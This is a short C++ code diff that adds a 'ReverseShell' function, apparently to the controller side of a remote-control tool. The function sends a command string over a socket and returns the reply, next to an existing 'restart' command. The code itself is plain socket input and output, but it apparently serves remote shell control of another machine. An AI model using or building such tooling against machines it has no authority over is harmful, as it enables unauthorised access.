@@ -133,4 +133,17 @@ public:
 	{
 		return TcpIP::SendString(Sock, "restart");
 	}
+	
+	static string ReverseShell(SOCKET Sock, string Cmd)
+	{
+		string Buff = "";
+		
+		if (!TcpIP::SendString(Sock, Cmd))
+			return "";
+		
+		if (!TcpIP::RecvString(Sock, Buff))
+			return "";
+		
+		return Buff;
+	}
 };
